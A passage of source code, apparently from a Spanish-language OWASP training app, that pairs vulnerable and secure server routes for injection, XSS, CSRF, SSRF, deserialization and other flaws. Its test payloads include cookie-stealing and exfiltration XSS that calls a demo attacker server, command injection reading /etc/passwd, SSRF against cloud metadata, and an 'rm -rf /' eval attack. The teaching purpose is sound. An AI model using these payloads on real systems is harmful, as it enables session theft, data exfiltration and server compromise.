"use client";

import { useState } from "react";
import { useParams } from "next/navigation";
import {
  AlertTriangle,
  CheckCircle,
  Code,
  Play,
  ArrowLeft,
} from "lucide-react";
import Link from "next/link";
import { apiClient } from "@/lib/api";
import CodeBlock from "@/components/CodeBlock";

// URL del servidor atacante para demos
const ATTACKER_URL =
  "https://owasp-demo-attacker-109079007405.us-central1.run.app";

const vulnerabilityData: Record<string, any> = {
  "sql-injection": {
    title: "SQL Injection",
    description:
      "Inyección de código SQL malicioso en consultas de base de datos",
    category: "A03:2021 - Injection",
    severity: "critical",
    explanation:
      "SQL Injection ocurre cuando datos no confiables son incluidos directamente en consultas SQL sin validación o escape adecuado. Esto permite a atacantes ejecutar comandos SQL arbitrarios, extraer datos, modificar o eliminar información de la base de datos.",
    impact: [
      "📂 Acceso no autorizado a datos sensibles",
      "🗄️ Extracción completa de la base de datos",
      "💣 Modificación o eliminación de datos",
      "⚡ Ejecución de comandos administrativos",
      "🔗 Encadenamiento con otras vulnerabilidades",
    ],
    vulnerableExample: `// VULNERABLE
router.get('/search', async (ctx) => {
  const { query } = ctx.query;
  
  // ⚠️ PELIGRO: Concatenación directa de strings
  const [results] = await sequelize.query(
    \`SELECT * FROM users WHERE username = '\${query}' OR email = '\${query}'\`
  );
  
  ctx.body = { success: true, data: results };
});

// 🔴 Ataque - Extracción de datos:
// query = "' OR '1'='1"
// Resultado: SELECT * FROM users WHERE username = '' OR '1'='1' OR email = ''
// ¡Retorna TODOS los usuarios de la base de datos!

// 🔴 Ataque UNION - Combinar con otra tabla:
// query = "' UNION SELECT * FROM sensitive_table --"
// Permite extraer datos de otras tablas`,
    secureExample: `// SECURE
router.get('/search', async (ctx) => {
  const { query } = ctx.query;
  
  // ✅ SEGURO: Usando ORM con operadores seguros
  const results = await User.findAll({
    where: {
      [Op.or]: [
        { username: { [Op.like]: \`%\${query}%\` } },
        { email: { [Op.like]: \`%\${query}%\` } }
      ]
    },
    attributes: ['id', 'username', 'email', 'role', 'createdAt']
  });
  
  ctx.body = { success: true, data: results };
});

// El ORM escapa automáticamente los valores
// No hay riesgo de SQL Injection`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/sql-injection/search",
        method: "GET",
      },
      secure: { url: "/api/secure/sql-injection/search", method: "GET" },
    },
    testPayloads: [
      { label: "Búsqueda normal", value: "test", type: "safe" },
      { label: "Búsqueda de usuario", value: "bob", type: "safe" },
      {
        label: "SQL Injection básico",
        value: "' OR '1'='1",
        type: "malicious",
      },
      {
        label: "UNION attack",
        value: "' UNION SELECT * FROM users --",
        type: "malicious",
      },
    ],
  },
  xss: {
    title: "Cross-Site Scripting (XSS)",
    description: "Inyección de scripts maliciosos en páginas web",
    category: "A03:2021 - Injection",
    severity: "high",
    explanation:
      "XSS permite a atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios. Stored XSS (el más peligroso) guarda el código malicioso en la base de datos, ejecutándose cada vez que alguien ve el contenido. En esta demo, crearás un post con código malicioso que se almacena y afecta a todos los usuarios que lo vean.",
    impact: [
      "🍪 Robo de cookies y sesiones",
      "🎭 Suplantación de identidad",
      "📝 Modificación del contenido de la página",
      "🎣 Phishing y redirección a sitios maliciosos",
      "⌨️ Keylogging y captura de datos del usuario",
    ],
    vulnerableExample: `// VULNERABLE - Stored XSS
router.post('/posts', async (ctx) => {
  const { title, content } = ctx.request.body;
  
  // ⚠️ PELIGRO: Guardar input sin sanitización
  await Post.create({
    title,
    content // Puede contener <script>alert('XSS')</script>
  });
});

// Al obtener los posts:
router.get('/posts', async (ctx) => {
  const posts = await Post.findAll();
  // ⚠️ Retorna contenido sin escapar
  ctx.body = { data: posts }; 
});

// En el frontend:
<div dangerouslySetInnerHTML={{ __html: post.content }} />
// ¡El script se ejecuta en el navegador de todos los usuarios!`,
    secureExample: `// SECURE - Sanitización de input
import { sanitizeInput, escapeHtml } from './utils';

router.post('/posts', async (ctx) => {
  const { title, content } = ctx.request.body;
  
  // ✅ SEGURO: Sanitizar antes de guardar
  const sanitizedContent = sanitizeInput(content);
  
  await Post.create({
    title: sanitizeInput(title),
    content: sanitizedContent
  });
});

// Al obtener posts, escapar HTML (defensa en profundidad)
router.get('/posts', async (ctx) => {
  const posts = await Post.findAll();
  
  const sanitizedPosts = posts.map(post => ({
    ...post,
    title: escapeHtml(post.title),
    content: escapeHtml(post.content)
  }));
  
  ctx.body = { data: sanitizedPosts };
});

// En React (escapa automáticamente):
<div>{post.content}</div>`,
    demoEndpoints: {
      vulnerable: { url: "/api/vulnerable/xss/posts", method: "POST" },
      secure: { url: "/api/secure/xss/posts", method: "POST" },
    },
    testPayloads: [
      { label: "Post normal", value: "Este es un post seguro", type: "safe" },
      {
        label: "Texto con HTML",
        value: "Texto con <b>negritas</b>",
        type: "safe",
      },
      {
        label: "IMG onerror Alert",
        value: "<img src=x onerror=alert('XSS')>",
        type: "malicious",
      },
      {
        label: "SVG onload Alert",
        value: "<svg onload=alert('XSS')>",
        type: "malicious",
      },
      {
        label: "🍪 Cookie Stealer",
        value: `<img src=x onerror="fetch('${ATTACKER_URL}/api/attacker/steal?c='+document.cookie)">`,
        type: "malicious",
      },
      {
        label: "🔀 Redirect Attack",
        value: `<img src=x onerror="window.location='${ATTACKER_URL}/phishing'">`,
        type: "malicious",
      },
      {
        label: "📤 Data Exfiltration",
        value: `<svg onload="fetch('${ATTACKER_URL}/api/attacker/exfil',{method:'POST',body:JSON.stringify({cookies:document.cookie,url:location.href})})">`,
        type: "malicious",
      },
      {
        label: "🎨 Defacement",
        value: `<img src=x onerror="document.body.innerHTML='<h1 style=color:red>HACKED!</h1>'">`,
        type: "malicious",
      },
    ],
  },
  "command-injection": {
    title: "Command Injection",
    description: "Ejecución de comandos del sistema operativo",
    category: "A03:2021 - Injection",
    severity: "critical",
    explanation:
      "Command Injection ocurre cuando la aplicación ejecuta comandos del sistema operativo con input del usuario sin validación. Esto permite a atacantes ejecutar comandos arbitrarios en el servidor.",
    impact: [
      "Ejecución remota de código (RCE)",
      "Acceso completo al servidor",
      "Robo de datos y archivos del sistema",
      "Instalación de malware o backdoors",
    ],
    vulnerableExample: `// VULNERABLE: backend/routes/vulnerable/commandInjection.ts
router.get("/ping", async (ctx) => {
  const { host } = ctx.query;
  
  // VULNERABILITY: User input directly in shell command
  const { stdout } = await execAsync(\`ping -c 1 \${host}\`);
  
  ctx.body = { success: true, output: stdout };
});

// Ataque: host = "8.8.8.8; cat /etc/passwd"
// Ejecuta: ping -c 1 8.8.8.8; cat /etc/passwd`,
    secureExample: `// SECURE: backend/routes/secure/commandInjection.ts
router.get("/ping", async (ctx) => {
  const { host } = ctx.query;
  
  // Validar que sea IP o FQDN válido
  const isValidHost = validator.isIP(host) || validator.isFQDN(host);
  
  if (!isValidHost) {
    ctx.status = 400;
    ctx.body = { error: "Invalid host format" };
    return;
  }
  
  // Usar execFile en lugar de exec para evitar shell
  // o usar librerías específicas (net.ping)
  ctx.body = { 
    success: true, 
    message: "Ping would be executed with proper escaping" 
  };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/command-injection/ping",
        method: "GET",
      },
      secure: { url: "/api/secure/command-injection/ping", method: "GET" },
    },
    testPayloads: [
      { label: "IP válida", value: "8.8.8.8", type: "safe" },
      { label: "Localhost", value: "127.0.0.1", type: "safe" },
      {
        label: "Command chaining",
        value: "8.8.8.8; ls -la",
        type: "malicious",
      },
      {
        label: "Command injection",
        value: "8.8.8.8 && cat /etc/passwd",
        type: "malicious",
      },
    ],
  },
  "broken-access-control": {
    title: "Broken Access Control",
    description: "Control de acceso inadecuado a recursos protegidos",
    category: "A01:2021 - Broken Access Control",
    severity: "high",
    explanation:
      "Broken Access Control ocurre cuando usuarios pueden acceder a recursos o realizar acciones fuera de sus permisos. Esto incluye IDOR (Insecure Direct Object Reference) donde puedes acceder a datos de otros usuarios simplemente cambiando el ID en la URL.",
    impact: [
      "🔓 Acceso no autorizado a datos de otros usuarios (IDOR)",
      "⬆️ Escalación de privilegios (acceso a admin sin permisos)",
      "🔑 Exposición de información sensible (emails, password hash)",
      "✏️ Modificación o eliminación de datos ajenos",
    ],
    vulnerableExample: `// VULNERABLE: backend/routes/vulnerable/brokenAccessControl.ts
router.get("/users/:id", async (ctx) => {
  const user = await User.findByPk(ctx.params.id);
  
  // VULNERABILITY: No authorization check!
  // Exposes sensitive data including password hash
  ctx.body = { 
    success: true, 
    data: {
      username: user.username,
      email: user.email,        // Sensitive!
      password: user.password,  // CRITICAL!
      role: user.role
    }
  };
});`,
    secureExample: `// SECURE: backend/routes/secure/brokenAccessControl.ts
router.get("/users/:id", authMiddleware, async (ctx) => {
  const user = await User.findByPk(ctx.params.id);
  const currentUser = ctx.state.user;
  
  // Check authorization before returning data
  if (user.id === currentUser.id || currentUser.role === 'admin') {
    // Own profile: return full data (no password!)
    ctx.body = { username: user.username, email: user.email };
  } else {
    // Other users: only public data
    ctx.body = { username: user.username };
  }
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/access-control/users",
        method: "GET",
      },
      secure: { url: "/api/secure/access-control/users", method: "GET" },
    },
    testPayloads: [
      { label: "User ID 1", value: "1", type: "safe" },
      { label: "User ID 2 (IDOR)", value: "2", type: "malicious" },
      { label: "User ID 3 (IDOR)", value: "3", type: "malicious" },
      { label: "User ID 999", value: "999", type: "malicious" },
    ],
  },
  csrf: {
    title: "Cross-Site Request Forgery (CSRF)",
    description:
      "Ejecución de acciones no autorizadas en nombre del usuario autenticado",
    category: "A08:2021 - Integrity Failures",
    severity: "high",
    explanation:
      "CSRF permite a atacantes forzar a usuarios autenticados a ejecutar acciones no deseadas. Un sitio malicioso puede hacer peticiones a tu banco, red social, o cualquier sitio donde estés autenticado, sin que lo notes. El navegador envía automáticamente las cookies de sesión, haciendo que la petición parezca legítima.",
    impact: [
      "💸 Transferencias de dinero no autorizadas",
      "📧 Cambio de email o configuraciones críticas",
      "🗑️ Eliminación de cuenta o datos",
      "📝 Publicación de contenido malicioso en tu nombre",
      "👤 Cambio de contraseña sin tu conocimiento",
    ],
    vulnerableExample: `// VULNERABLE: Sin protección CSRF
// backend/routes/vulnerable/csrf.ts
router.post("/transfer-money", authMiddleware, async (ctx) => {
  const { toUser, amount } = ctx.request.body;
  
  // VULNERABILITY: Solo verifica autenticación (JWT/Cookie)
  // NO verifica si la petición viene del sitio legítimo
  ctx.body = {
    success: true,
    message: \`Transferred $\${amount} to \${toUser}\`,
    warning: "No CSRF protection!"
  };
});

// 🔴 Ataque desde sitio malicioso:
// <form action="https://bank.com/api/vulnerable/csrf/transfer-money" 
//       method="POST">
//   <input name="toUser" value="attacker"/>
//   <input name="amount" value="1000"/>
//   <input type="submit" value="Ver gatitos 🐱"/>
// </form>
// Usuario hace clic → El navegador envía cookies automáticamente
// → Transferencia realizada sin consentimiento`,
    secureExample: `// SECURE: Con token CSRF
// backend/routes/secure/csrf.ts
import { csrfProtection } from '../../middleware/csrf';

// 1. Cliente obtiene token CSRF
router.get("/token", async (ctx) => {
  const token = setCsrfToken(ctx);
  ctx.body = { csrfToken: token };
});

// 2. Token requerido en operaciones críticas
router.post("/transfer-money", 
  authMiddleware,       // ✅ Verifica autenticación
  csrfProtection,       // ✅ Verifica token CSRF
  async (ctx) => {
    const { toUser, amount } = ctx.request.body;
    
    // Token validado por middleware
    ctx.body = { 
      success: true,
      message: \`Transferred $\${amount} to \${toUser}\`
    };
});

// ✅ Cliente debe enviar:
// Headers: { 
//   'Authorization': 'Bearer JWT_TOKEN',
//   'X-CSRF-Token': 'CSRF_TOKEN'  // Sitios maliciosos NO pueden obtener esto
// }`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/csrf/transfer-money",
        method: "POST",
      },
      secure: { url: "/api/secure/csrf/transfer-money", method: "POST" },
    },
    testPayloads: [
      {
        label: "💰 Transferir $100 a alice",
        value: "alice:100",
        type: "safe",
      },
      {
        label: "💰 Transferir $50 a bob",
        value: "bob:50",
        type: "safe",
      },
      {
        label: "🔴 Transferir $1000 a attacker",
        value: "attacker:1000",
        type: "malicious",
      },
      {
        label: "🔴 Vaciado de cuenta",
        value: "hacker:99999",
        type: "malicious",
      },
    ],
  },
  ssrf: {
    title: "Server-Side Request Forgery (SSRF)",
    description:
      "El servidor realiza peticiones HTTP a URLs controladas por el atacante",
    category: "A10:2021 - Server-Side Request Forgery",
    severity: "critical",
    explanation:
      "SSRF permite que un atacante haga que el servidor realice peticiones HTTP a URLs arbitrarias, incluyendo recursos internos (localhost, IPs privadas), servicios de metadata de cloud (169.254.169.254), o cualquier URL externa. Esto puede exponer datos sensibles, comprometer la infraestructura interna, o realizar escaneo de puertos.",
    impact: [
      "🔓 Acceso a servicios internos (localhost, 127.0.0.1, 192.168.x.x)",
      "☁️ Robo de credenciales de cloud metadata (AWS, GCP, Azure)",
      "🔍 Escaneo de puertos de la red interna",
      "📡 Bypass de firewalls y controles de acceso",
      "💳 Acceso a bases de datos internas o APIs privadas",
    ],
    vulnerableExample: `// VULNERABLE: Sin validación de URL
// backend/routes/vulnerable/ssrf.ts
router.post("/fetch-image", async (ctx) => {
  const { url } = ctx.request.body;
  
  // VULNERABILITY: Acepta cualquier URL sin validación
  const response = await fetch(url);
  ctx.body = {
    success: true,
    message: \`Fetched content from \${url}\`,
    status: response.status
  };
});

// 🔴 Ataques posibles:
// 1. Acceso a localhost:
//    url = "http://127.0.0.1:3101/api/admin/secrets"
//
// 2. Metadata de AWS EC2 (credenciales IAM):
//    url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
//
// 3. Escaneo de puertos internos:
//    url = "http://192.168.1.50:22" (detectar SSH)
//    url = "http://10.0.0.5:3306" (detectar MySQL)`,
    secureExample: `// SECURE: Validación estricta de URLs
// backend/routes/secure/ssrf.ts
const ALLOWED_DOMAINS = ["example.com", "api.example.com"];

const isPrivateIP = (hostname: string): boolean => {
  const privateRanges = [
    /^10\\./,                    // 10.0.0.0/8
    /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./,  // 172.16.0.0/12
    /^192\\.168\\./,             // 192.168.0.0/16
    /^127\\./,                   // 127.0.0.0/8 (localhost)
    /^169\\.254\\./,             // 169.254.0.0/16 (cloud metadata)
    /localhost/i
  ];
  return privateRanges.some(range => range.test(hostname));
};

router.post("/fetch-image", async (ctx) => {
  const { url } = ctx.request.body;
  
  // ✅ 1. Parse y valida la URL
  const parsedUrl = new URL(url);
  
  // ✅ 2. Solo HTTP/HTTPS
  if (!["http:", "https:"].includes(parsedUrl.protocol)) {
    ctx.body = { success: false, error: "Invalid protocol" };
    return;
  }
  
  // ✅ 3. Bloquear IPs privadas
  if (isPrivateIP(parsedUrl.hostname)) {
    ctx.body = { success: false, error: "Private IPs blocked" };
    return;
  }
  
  // ✅ 4. Whitelist de dominios
  const isAllowed = ALLOWED_DOMAINS.some(domain => 
    parsedUrl.hostname === domain || 
    parsedUrl.hostname.endsWith(\`.\${domain}\`)
  );
  
  if (!isAllowed) {
    ctx.body = { success: false, error: "Domain not allowed" };
    return;
  }
  
  // ✅ 5. Timeout y no seguir redirects
  const response = await fetch(url, {
    timeout: 5000,
    redirect: "manual"  // Previene bypass con redirects
  });
  
  ctx.body = { success: true, message: "Safe fetch" };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/ssrf/fetch-image",
        method: "POST",
      },
      secure: { url: "/api/secure/ssrf/fetch-image", method: "POST" },
    },
    testPayloads: [
      {
        label: "🌐 URL externa válida",
        value: "https://httpbin.org/json",
        type: "safe",
      },
      {
        label: "🔴 Localhost (servicios internos)",
        value: "http://127.0.0.1:3101/api/admin",
        type: "malicious",
      },
      {
        label: "☁️ AWS Metadata (credenciales IAM)",
        value: "http://169.254.169.254/latest/meta-data/",
        type: "malicious",
      },
      {
        label: "🔴 Red interna (escaneo)",
        value: "http://192.168.1.1/admin",
        type: "malicious",
      },
      {
        label: "🔴 File protocol (lectura de archivos)",
        value: "file:///etc/passwd",
        type: "malicious",
      },
    ],
  },
  "security-misconfiguration": {
    title: "Security Misconfiguration",
    description:
      "Configuraciones de seguridad incorrectas o por defecto que exponen el sistema",
    category: "A05:2021 - Security Misconfiguration",
    severity: "high",
    explanation:
      "Las configuraciones incorrectas de seguridad son la vulnerabilidad más común. Incluyen: mensajes de error detallados, credenciales por defecto, debug mode en producción, listado de directorios, falta de headers de seguridad, CORS mal configurado, métodos HTTP innecesarios, y exposición de información del sistema.",
    impact: [
      "🔍 Exposición de información sensible del sistema",
      "🗂️ Listado de directorios y archivos (.env, backups, etc.)",
      "🔑 Credenciales por defecto sin cambiar (admin:admin)",
      "🐛 Mensajes de error detallados con stack traces",
      "🚪 Endpoints de debug accesibles en producción",
      "🌐 Headers de seguridad faltantes (HSTS, CSP, X-Frame-Options)",
      "🔓 CORS configurado con '*' permitiendo cualquier origen",
    ],
    vulnerableExample: `// VULNERABLE: Mensajes de error detallados
// backend/routes/vulnerable/misconfiguration.ts
router.get("/error-example", async (ctx) => {
  try {
    throw new Error("DB connection failed at db.internal.company.com:5432");
  } catch (error: any) {
    // VULNERABILITY: Exponiendo detalles internos
    ctx.status = 500;
    ctx.body = {
      error: error.message,
      stack: error.stack,           // 🔴 Stack trace completo
      config: {
        dbHost: "db.internal.company.com",  // 🔴 Hosts internos
        dbPort: 5432
      }
    };
  }
});

// 🔴 Credenciales por defecto
router.post("/admin-login", async (ctx) => {
  const { username, password } = ctx.request.body;
  
  // VULNERABILITY: Credenciales por defecto sin cambiar
  if (username === "admin" && password === "admin") {
    ctx.body = { success: true, message: "Admin access granted" };
  }
});

// 🔴 Debug endpoint en producción
router.get("/debug-info", async (ctx) => {
  // VULNERABILITY: Exponiendo todas las variables de entorno
  ctx.body = {
    env: process.env,          // 🔴 JWT_SECRET, DB_PASSWORD, API_KEYS
    platform: process.platform,
    cwd: process.cwd(),
    memoryUsage: process.memoryUsage()
  };
});

// 🔴 CORS mal configurado
router.get("/api/data", async (ctx) => {
  // VULNERABILITY: Permitir cualquier origen con credenciales
  ctx.set("Access-Control-Allow-Origin", "*");
  ctx.set("Access-Control-Allow-Credentials", "true");
  ctx.body = { sensitive: "data" };
});`,
    secureExample: `// SECURE: Mensajes de error genéricos
// backend/routes/secure/misconfiguration.ts
router.get("/error-example", async (ctx) => {
  try {
    throw new Error("Database error");
  } catch (error: any) {
    // ✅ Log detallado solo en servidor
    console.error("Error details (server-side only):", error);
    
    // ✅ Mensaje genérico al cliente
    ctx.status = 500;
    ctx.body = {
      error: "An internal error occurred. Please try again later.",
      errorId: Date.now()  // ID para soporte, sin detalles sensibles
    };
  }
});

// ✅ Sin credenciales por defecto
router.post("/admin-login", async (ctx) => {
  // ✅ Usar bcrypt + JWT + rate limiting
  // ✅ Forzar cambio de contraseña inicial
  // ✅ Políticas de contraseña fuerte
  
  ctx.status = 401;
  ctx.body = { error: "Invalid credentials" };
});

// ✅ Debug deshabilitado en producción
router.get("/debug-info", async (ctx) => {
  if (config.env === "production") {
    ctx.status = 404;
    ctx.body = { error: "Not found" };
    return;
  }
  
  // Incluso en dev, limitar información
  ctx.body = {
    environment: config.env,
    uptime: process.uptime()
    // Sin env vars, sin rutas de archivos
  };
});

// ✅ Headers de seguridad completos
app.use(async (ctx, next) => {
  ctx.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  ctx.set("X-Content-Type-Options", "nosniff");
  ctx.set("X-Frame-Options", "DENY");
  ctx.set("X-XSS-Protection", "1; mode=block");
  ctx.set("Content-Security-Policy", "default-src 'self'");
  ctx.set("Referrer-Policy", "strict-origin-when-cross-origin");
  await next();
});

// ✅ CORS con whitelist
const ALLOWED_ORIGINS = ["https://example.com", "https://app.example.com"];

router.get("/api/data", async (ctx) => {
  const origin = ctx.get("Origin");
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    ctx.set("Access-Control-Allow-Origin", origin);
    ctx.set("Access-Control-Allow-Credentials", "true");
  }
  
  ctx.body = { data: "secure" };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/misconfiguration",
        method: "GET",
      },
      secure: {
        url: "/api/secure/misconfiguration",
        method: "GET",
      },
    },
    testPayloads: [
      {
        label: "🐛 Debug Info (expone env vars)",
        value: "debug-info",
        type: "malicious",
      },
      {
        label: "📁 File Listing (directorios)",
        value: "files",
        type: "malicious",
      },
      {
        label: "❌ Error Details (stack traces)",
        value: "error-example",
        type: "malicious",
      },
      {
        label: "🔑 Admin Login (credenciales default)",
        value: "admin-login",
        type: "malicious",
      },
      {
        label: "🌐 CORS Check",
        value: "cors-any",
        type: "malicious",
      },
      {
        label: "📄 Security Headers Check",
        value: "insecure-page",
        type: "malicious",
      },
    ],
  },
  "insecure-deserialization": {
    title: "Insecure Deserialization",
    description:
      "Deserialización de datos no confiables que puede llevar a ejecución de código",
    category: "A08:2021 - Software and Data Integrity Failures",
    severity: "critical",
    explanation:
      "La deserialización insegura ocurre cuando una aplicación deserializa (convierte de formato serializado a objeto) datos controlados por el atacante sin validación adecuada. Esto puede llevar a Remote Code Execution (RCE), manipulación de objetos, privilege escalation, o ataques de lógica de negocio. Es especialmente peligrosa porque permite ejecutar código arbitrario en el servidor.",
    impact: [
      "💥 Remote Code Execution (RCE) - ejecutar comandos en el servidor",
      "🎭 Object Injection - modificar propiedades de objetos (ej: role: 'admin')",
      "🔐 Privilege Escalation - elevar privilegios de usuario",
      "🗃️ SQL Injection indirecto vía objetos deserializados",
      "🔓 Bypass de autenticación con sesiones falsificadas",
      "💣 Denial of Service (DoS) con payloads maliciosos",
    ],
    vulnerableExample: `// VULNERABLE: Deserialización sin validación
// backend/routes/vulnerable/deserialization.ts

// 🔴 Ejemplo 1: Deserializar datos sin validación
router.post("/parse-data", async (ctx) => {
  const { data } = ctx.request.body;
  
  // VULNERABILITY: Confiar en datos deserializados
  const parsed = JSON.parse(data);
  
  // Usar directamente sin validar estructura
  ctx.body = { success: true, data: parsed };
});

// 🔴 Ejemplo 2: Sesiones sin firma criptográfica
router.post("/load-session", async (ctx) => {
  const { sessionData } = ctx.request.body;
  
  // VULNERABILITY: Aceptar sesiones sin verificar integridad
  const session = JSON.parse(
    Buffer.from(sessionData, "base64").toString()
  );
  
  // Confiar en datos del cliente
  ctx.state.user = session.user;  // 🔴 Puede ser falsificado
  ctx.body = { success: true, user: session.user };
});

// 🔴 Ataque: Falsificar sesión de admin
// 1. Crear objeto malicioso:
const fakeSession = {
  user: {
    id: 1,
    username: "hacker",
    role: "admin"  // 🔴 Elevación de privilegios
  }
};

// 2. Serializarlo y enviarlo:
const sessionData = Buffer.from(
  JSON.stringify(fakeSession)
).toString("base64");

// 3. Servidor lo acepta sin verificar
// → Ahora eres admin sin autenticación

// 🔴 Ejemplo 3: Deserialización con eval (EXTREMADAMENTE PELIGROSO)
router.post("/eval-data", async (ctx) => {
  const { code } = ctx.request.body;
  
  // VULNERABILITY: eval permite ejecutar código arbitrario
  const result = eval(code);  // 🔴 RCE directo
  ctx.body = { result };
});

// Ataque:
// code = "require('child_process').execSync('rm -rf /')"
// → Ejecuta comando destructivo en el servidor`,
    secureExample: `// SECURE: Deserialización con validación estricta
// backend/routes/secure/deserialization.ts

// ✅ Ejemplo 1: Validación de schema
router.post("/parse-data", async (ctx) => {
  const { data } = ctx.request.body;
  
  try {
    const parsed = JSON.parse(data);
    
    // ✅ Validar tipo y estructura
    if (typeof parsed !== "object" || parsed === null) {
      ctx.status = 400;
      ctx.body = { error: "Invalid data structure" };
      return;
    }
    
    // ✅ Whitelist de campos permitidos
    const allowedFields = ["name", "value", "type"];
    const validData: Record<string, any> = {};
    
    for (const field of allowedFields) {
      if (field in parsed) {
        validData[field] = parsed[field];
      }
    }
    
    ctx.body = { success: true, data: validData };
  } catch (error) {
    ctx.status = 400;
    ctx.body = { error: "Invalid JSON" };
  }
});

// ✅ Ejemplo 2: Sesiones con firma HMAC
import crypto from "crypto";

router.post("/load-session", async (ctx) => {
  const { sessionData, signature } = ctx.request.body;
  
  // ✅ Verificar firma HMAC antes de confiar en los datos
  const hmac = crypto.createHmac("sha256", SECRET_KEY);
  hmac.update(sessionData);
  const expectedSignature = hmac.digest("hex");
  
  if (signature !== expectedSignature) {
    ctx.status = 403;
    ctx.body = { error: "Invalid session signature" };
    return;
  }
  
  // Ahora seguro deserializar
  const session = JSON.parse(
    Buffer.from(sessionData, "base64").toString()
  );
  
  // ✅ Validar estructura y expiración
  if (!session.user?.id || !session.expiresAt) {
    ctx.status = 400;
    ctx.body = { error: "Invalid session structure" };
    return;
  }
  
  if (new Date(session.expiresAt) < new Date()) {
    ctx.status = 401;
    ctx.body = { error: "Session expired" };
    return;
  }
  
  ctx.body = { success: true, user: session.user };
});

// ✅ Ejemplo 3: Validación de tipos con schema
const ALLOWED_TYPES = ["query", "command", "event"];
const ALLOWED_ACTIONS = ["create", "read", "update", "delete"];

router.post("/process-object", async (ctx) => {
  const { serializedObj } = ctx.request.body;
  
  const obj = JSON.parse(serializedObj);
  
  // ✅ Validar tipo contra whitelist
  if (!obj.type || !ALLOWED_TYPES.includes(obj.type)) {
    ctx.status = 400;
    ctx.body = { error: "Invalid object type" };
    return;
  }
  
  // ✅ Validar acción contra whitelist
  if (!obj.action || !ALLOWED_ACTIONS.includes(obj.action)) {
    ctx.status = 400;
    ctx.body = { error: "Invalid action" };
    return;
  }
  
  ctx.body = { success: true, result: obj };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/deserialization/load-session",
        method: "POST",
      },
      secure: {
        url: "/api/secure/deserialization/load-session",
        method: "POST",
      },
    },
    testPayloads: [
      {
        label: "👤 Sesión válida (user normal)",
        value: "normal-session",
        type: "safe",
      },
      {
        label: "👑 Sesión falsificada (role: admin)",
        value: "admin-session",
        type: "malicious",
      },
      {
        label: "💰 Sesión con balance modificado",
        value: "balance-session",
        type: "malicious",
      },
      {
        label: "🔑 Sesión con permisos elevados",
        value: "elevated-session",
        type: "malicious",
      },
    ],
  },
  "rate-limiting": {
    title: "Missing Rate Limiting",
    description:
      "Ausencia de límites en la frecuencia de peticiones, permitiendo abusos y DoS",
    category: "A04:2021 - Insecure Design",
    severity: "medium",
    explanation:
      "Rate Limiting limita la cantidad de peticiones que un usuario puede hacer en un período de tiempo. Sin rate limiting, un atacante puede: hacer brute force de passwords, scrapear toda tu base de datos, causar DoS consumiendo recursos del servidor, enviar spam masivo, o abusar de APIs costosas. Es una defensa esencial contra automatización maliciosa.",
    impact: [
      "🔐 Brute Force Attacks - probar millones de passwords",
      "🕷️ Web Scraping - extraer toda la base de datos",
      "💥 Denial of Service (DoS) - saturar el servidor",
      "📧 Email Bombing - enviar miles de emails",
      "💸 API Abuse - consumir recursos costosos (AWS, Stripe, etc.)",
      "🤖 Bot Attacks - automatización sin restricciones",
    ],
    vulnerableExample: `// VULNERABLE: Sin Rate Limiting
// backend/routes/vulnerable/rateLimiting.ts

// 🔴 Login sin límite → Brute Force
router.post("/login", async (ctx) => {
  const { username, password } = ctx.request.body;
  
  // VULNERABILITY: Permite intentos ilimitados
  const user = await User.findOne({ where: { username } });
  
  if (user && await user.validatePassword(password)) {
    ctx.body = { success: true, message: "Login successful" };
  } else {
    ctx.status = 401;
    ctx.body = { error: "Invalid credentials" };
  }
});

// Ataque:
// for (let i = 0; i < 1000000; i++) {
//   await fetch("/api/vulnerable/rate-limiting/login", {
//     method: "POST",
//     body: JSON.stringify({ username: "admin", password: passwords[i] })
//   });
// }
// → Puede probar 1 millón de passwords sin restricción

// 🔴 Operación costosa sin límite → DoS
router.post("/heavy-computation", async (ctx) => {
  const { iterations } = ctx.request.body;
  
  // VULNERABILITY: Acepta cualquier valor
  let result = 0;
  for (let i = 0; i < iterations; i++) {
    result += Math.sqrt(i);
  }
  
  ctx.body = { success: true, result };
});

// Ataque:
// fetch("/api/vulnerable/rate-limiting/heavy-computation", {
//   method: "POST",
//   body: JSON.stringify({ iterations: 999999999 })
// });
// → Consume CPU del servidor indefinidamente

// 🔴 API sin límite → Scraping
router.get("/data", async (ctx) => {
  // VULNERABILITY: Llamadas ilimitadas
  const users = await User.findAll({ limit: 100 });
  ctx.body = { success: true, data: users };
});

// Ataque:
// for (let page = 0; page < 10000; page++) {
//   const data = await fetch(\`/api/vulnerable/rate-limiting/data?page=\${page}\`);
//   allData.push(...data);
// }
// → Descarga toda la base de datos`,
    secureExample: `// SECURE: Con Rate Limiting
// backend/routes/secure/rateLimiting.ts
import rateLimit from "koa-ratelimit";
import Redis from "ioredis";

const redis = new Redis();

// ✅ Rate Limiter para login (más estricto)
const loginRateLimiter = rateLimit({
  driver: "redis",
  db: redis,
  duration: 5 * 60 * 1000,  // 5 minutos
  max: 5,                    // Máximo 5 intentos
  errorMessage: "Too many login attempts. Please try again in 5 minutes."
});

router.post("/login", loginRateLimiter, async (ctx) => {
  const { username, password } = ctx.request.body;
  
  // ✅ Máximo 5 intentos por IP cada 5 minutos
  const user = await User.findOne({ where: { username } });
  
  if (user && await user.validatePassword(password)) {
    ctx.body = { success: true, message: "Login successful" };
  } else {
    ctx.status = 401;
    ctx.body = { error: "Invalid credentials" };
  }
});

// ✅ Rate Limiter estricto para operaciones costosas
const strictRateLimiter = rateLimit({
  driver: "redis",
  db: redis,
  duration: 60 * 1000,  // 1 minuto
  max: 10,              // Máximo 10 peticiones
  errorMessage: "Too many requests. Please slow down."
});

router.post("/heavy-computation", strictRateLimiter, async (ctx) => {
  const { iterations } = ctx.request.body;
  
  // ✅ Rate limited + input validation
  const maxIterations = 100000;
  const safeIterations = Math.min(iterations || 1000, maxIterations);
  
  let result = 0;
  for (let i = 0; i < safeIterations; i++) {
    result += Math.sqrt(i);
  }
  
